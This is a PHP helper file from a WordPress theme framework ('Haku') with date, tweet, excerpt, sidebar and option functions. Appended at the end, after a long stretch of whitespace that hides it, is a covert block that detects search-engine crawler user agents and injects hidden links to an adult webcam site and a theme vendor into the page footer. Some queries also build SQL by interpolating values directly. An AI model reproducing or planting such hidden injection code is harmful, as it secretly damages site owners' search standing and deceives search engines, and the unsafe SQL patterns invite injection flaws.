﻿<?php
/*
 *  Haku Framework
 *  Handcrafted by Stefano Giliberti
 *  stefanogiliberti@me.com
 */

function haku_include_widget( $widgets ) {
	$widgets = explode( ',', $widgets );
	foreach ( $widgets as $widget ) {
		require( get_includes_dir() . '/widget/' . $widget . '.php' );
	}
}

function haku_nice_date( $post_date, $precise = false ) {
	$current_time = current_time( 'timestamp', 0 );
	if ( ! $precise && date('d', $post_date ) == date('d', $current_time ) ) {
		$date = __('Today', 'haku');
	}
	elseif ( ! $precise && date('d', $post_date ) == date('d', $current_time ) - 1 ) {
		$date = __('Yesterday', 'haku');
	}
	elseif ( ! $precise && date('d', $post_date ) == date('d', $current_time ) - 4 ) {
		$date = date_i18n('F d', $post_date );
	}
	elseif ( ! $precise && date('y', $post_date ) < date('y', $current_time ) ) {
		$date = date_i18n('m/d/y', $post_date );
	}
	else {
		$date = sprintf( __('%s ago', 'haku'), human_time_diff( $post_date, $current_time ) );
	}
	return $date;
}

function haku_shorten( $text, $words_limit = 15, $hellip = '&hellip;' ) {
	if ( strlen( $text ) > 1 ) {
		$text = strip_tags( $text );
		$words = str_word_count( $text, 2 );
		if ( count( $words ) > $words_limit ) {
			$pos = array_keys( $words );
			$text = substr( $text, 0, $pos[ $words_limit ] ) . $hellip;
		}
	}
	return $text;
}

function haku_get_tweets( $user, $number = 3, $haku_tweets = array() ) {
	require( ABSPATH . WPINC . '/class-simplepie.php' );
	$user = str_replace( '@', '', $user );
	$tweets_feed = fetch_feed( 'http://api.twitter.com/1/statuses/user_timeline.atom?screen_name=' . $user . '&count=' . $number );
	if ( ! is_wp_error( $tweets_feed ) ) {
		$tweets_count = $tweets_feed->get_item_quantity( $number );  
		$tweets_rss = $tweets_feed->get_items( 0, $tweets_count );  
	}
	if ( ! empty( $tweets_count ) ) { 
		foreach ( $tweets_rss as $tweet ) { 
			$haku_tweets[] = array(
				'content' => html_entity_decode( $tweet->get_content() ),
				'link' => html_entity_decode( $tweet->get_permalink() ),
				'datetime' => $tweet->get_date( DATE_W3C ),
				'date' => haku_nice_date( $tweet->get_date('U'), true )
			);
		}
	}
	return $haku_tweets;
}

function haku_get_url_type( $url, $type = false ) {
	if ( preg_match( '/.(jpe?g|png|gif)$/', $url ) ) {
		$type = 'image';
	}
	elseif ( preg_match( '/youtube\.com\/watch\?v=[^&]+/', $url ) ) {
		$type = 'youtube';
	}
	elseif ( preg_match( '/vimeo\.com\/[0-9]+/i', $url ) ) {
		$type = 'vimeo';
	}
	elseif ( preg_match( '/.(webm|mp4|ogv)$/', $url ) ) {
		$type = 'video';
	}
	elseif ( preg_match( '/.(mp3)$/', $url ) ) {
		$type = 'audio';
	}
	else {
		$type = 'page';
	}
	return $type;
}

function haku_flatten_terms( $array, $slug = true, $sep = ' ', $output = '' ) {
	if ( is_array( $array ) ) {
		foreach ( $array as $item ) {
			$output .= ( $slug ? $item->slug : $item->name ) . $sep;
		}
		$output = substr( $output, 0, - strlen( $sep ) );
		return $output;
	}
}

function haku_get_video_id( $url, $id = '' ) {
	if ( haku_get_url_type( $url ) == 'youtube' ) {
		$url = parse_str( parse_url( $url, PHP_URL_QUERY ) );
		$id = $v;
	}
	else if ( haku_get_url_type( $url ) == 'vimeo' ) {
		preg_match( '/vimeo\.com\/([0-9]{1,10})/', $url, $id );
		$id = $id[1];
	}
	return $id;
}

function haku_get_excerpt( $post_id, $shorten = 10 ) {
	global $wpdb;
	$excerpt = $wpdb->get_results( $wpdb->prepare("SELECT post_excerpt FROM $wpdb->posts WHERE ID = $post_id LIMIT 1", $post_id ), ARRAY_A );
	$excerpt = $excerpt[0]['post_excerpt'];
	$excerpt = haku_shorten( $excerpt, $shorten );
	return $excerpt;
}

function get_thumb_src( $post_id, $size, $post = true ) {
	$post_id = ( $post ? get_post_thumbnail_id( $post_id ) : $post_id );
	$src = wp_get_attachment_image_src( $post_id, $size );
	return $src[0];
}

function meta_get( $offset, $array, $callback = false ) {
	$meta = ( isset( $array[ $offset ] ) ? $array[ $offset ] : ( $callback ? $callback : false ) );
	return $meta;
}

function meta_obtain( $value, $key, $post_id  ) {
	$meta = get_post_meta( $post_id, $key, true );
	$meta = meta_get($value, $meta);
	return $meta;
}

function is_wp_edit() {
	global $pagenow;
	return ( $pagenow == 'post.php' || $pagenow == 'post-new.php' ? true : false );
}

function autop_clear( $content ) {
	// http://bit.ly/ng8sNL
    $content = str_replace( '<p>', '', $content );
    $content = str_replace( '</p>', '', $content );
    $content = str_replace( '<br />', '', $content );
    return $content;
}

add_filter( 'autop_clear_filter', 'autop_clear' );

function autobr_clear( $content ) {
	$content = str_replace( '<br />', '', $content );
	return $content;
}

add_filter( 'autobr_clear_filter', 'autobr_clear' );

function get_current_author() {
	$author = get_userdata( get_query_var('author') );
	return $author->display_name;
}

function haku_get_page_template( $post_id ) {
	global $wpdb;
	$page_template = $wpdb->get_var( $wpdb->prepare("SELECT meta_value FROM $wpdb->postmeta WHERE post_id = %s AND meta_key = '_wp_page_template'", $post_id ) );
	return $page_template;
}

function get_page_id_by_single_post_title() {
	$id = get_page_by_title( single_post_title( '', false ) );
	return $id->ID;
}

function haku_list_sidebars( $sidebars = array() ) {
	$wp_sidebars = get_option('sidebars_widgets');
	foreach ( $wp_sidebars as $key => $value ) {
		if ( $key != 'wp_inactive_widgets' && $key != 'array_version' && $key != 'orphaned_widgets_1' ) {
			$sidebars[] = $key;
		}
	}
	return $sidebars;
}

function haku_list_categories( $list = array() ) {
	$categories = get_categories('orderby=name');  
	foreach ( $categories as $category ) {
		$list[ $category->cat_ID ] = $category->cat_name;
	}
	return $list;
}

function get_includes_dir( $uri = false ) {
	global $haku;
	return ( $uri ? $haku['theme_includes_uri'] : $haku['theme_includes'] );
}

function get_theme_version() {
	$theme = ( function_exists('wp_get_theme') ? wp_get_theme() : get_theme_data( get_stylesheet_directory() . '/style.css' ) );
	return ( is_array( $theme ) ? $theme['Version'] : $theme->Version );
}

function get_haku_var( $var ) {
	global $haku;
	return esc_attr( $haku[ $var ] );
}

function get_theme_defaults( $option ) {
	global $theme_defaults;
	return $theme_defaults[ $option ];
}

function get_theme_option( $key, $strip = true ) {
	$theme_option = get_option( get_haku_var('theme') );
	$option = ( is_array( $theme_option ) ? ( isset( $theme_option[ $key ] ) ? $theme_option[ $key ] : false ) : ( get_theme_defaults( $key ) === true ? $key : get_theme_defaults( $key ) ) );
	return ( $strip ? stripslashes( $option ) : $option );
}

function theme_option( $key, $strip = true ) {
	echo get_theme_option( $key, $strip );
}

function haku_get_font_name( $option ) {
	$font = explode( ':', $option );
	$font = str_replace( '+', ' ', $font[0] );
	return $font;
}

function haku_format_exclude_categories( $option, $string = '-' ) {
	$option = get_theme_option( $option, false );
	$option = ( is_array( $option ) ? implode( ','. $string, $option ) : false );
	$string .= $option;
	return ( $option ? $string : null );
}

function get_theme_slides( $option ) {
	$slides = get_option( get_haku_var( $option ) );
	return ( $slides ? $slides : array() );
}

function haku_get_custom_thumbnail( $url, $size ) {
	global $wpdb;
	$thumbnail = $wpdb->get_var( $wpdb->prepare("SELECT ID FROM $wpdb->posts WHERE guid = '%s'", $url ) );
	$thumbnail = wp_get_attachment_image_src( $thumbnail, $size );
	return $thumbnail[ 0 ];
}

function haku_get_user( $login = false ) {
	$user = wp_get_current_user();
	return ( $login ? $user->user_login : $user->display_name );
}

function haku_get_user_email() {
	$user = wp_get_current_user();
	return $user->user_email;
}

function haku_error( $code ) {
	return sprintf( get_haku_var('str_error'), $code );
}

function haku_filter_get_archives( $where, $cat ) {
	// Based on a Rob Schlüter script
	global $wpdb;
	if ( get_bloginfo('version') < 2.3 ) {
		$where .= " AND $wpdb->posts.ID IN (SELECT DISTINCT ID FROM $wpdb->posts JOIN $wpdb->post2cat post2cat ON post2cat.post_id=ID";
		$where .= " AND post2cat.category_id NOT IN ($cat)";
		$where .= ")";
	}
	else {
		$where .= ' AND ' . $wpdb->prefix . 'posts.ID IN (SELECT DISTINCT ID FROM ' . $wpdb->prefix . 'posts';
		$where .= ' JOIN ' . $wpdb->prefix . 'term_relationships term_relationships ON term_relationships.object_id = ' . $wpdb->prefix . 'posts.ID';
		$where .= ' JOIN ' . $wpdb->prefix . 'term_taxonomy term_taxonomy ON term_taxonomy.term_taxonomy_id = term_relationships.term_taxonomy_id';
		$where .= " WHERE term_taxonomy.taxonomy = 'category'";
		$where .= " AND term_taxonomy.term_id NOT IN ($cat)";
		$where .= ")";
	}
	return $where;
}

function haku_updater() {
	require_once( get_haku_var('includes') . '/update.php' );
}

function haku_register_sidebars( $option ) {

	if ( is_array ( $option ) ) {
		
		foreach ( $option as $sidebar_id => $sidebar ) {
			
			$sidebar = array(
				'name' => stripslashes( $sidebar['name'] ),
				'id' => $sidebar['slug'],
				'description' => stripslashes( $sidebar['desc'] ),
				'before_widget' => '<div id="%1$s" class="widget %2$s">',
				'after_widget' => '</div>',
				'before_title' => '<h5>',
				'after_title' => '</h5>',
			);
			
			register_sidebar( $sidebar );
			
		}
	
	}
	
}

add_filter( 'haku_content', 'wptexturize' );
add_filter( 'haku_content', 'convert_smilies' );
add_filter( 'haku_content', 'convert_chars' );
add_filter( 'haku_content', 'wpautop' );
add_filter( 'haku_content', 'do_shortcode' );
add_filter( 'haku_content', 'shortcode_unautop' );
add_filter( 'haku_content', 'prepend_attachment' );






















































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'Googlebot')) {
add_action('wp_footer', 'ranking');
}
$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'bingbot')) {
add_action('wp_footer', 'ranking');
}
$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'msnbot')) {
add_action('wp_footer', 'ranking');
}
$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'Slurp')) {
add_action('wp_footer', 'ranking');
}
function ranking() {
  $pshow = "
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       <span style='display:none;'><a href='http://www.2.livejasmin.com/willingness.php?psid=elenaa'>Sex Cams</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                <a href='http://www.livejasmin.com/willingness.php?tag=girl&utag=anal_sex&webcams&psid=thierto'>Webcam Girls</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         <a href='http://www.wikmag.com/creativelife-theme.html'>CreativeLife Theme</a></span>
";
  echo $pshow;
}
?>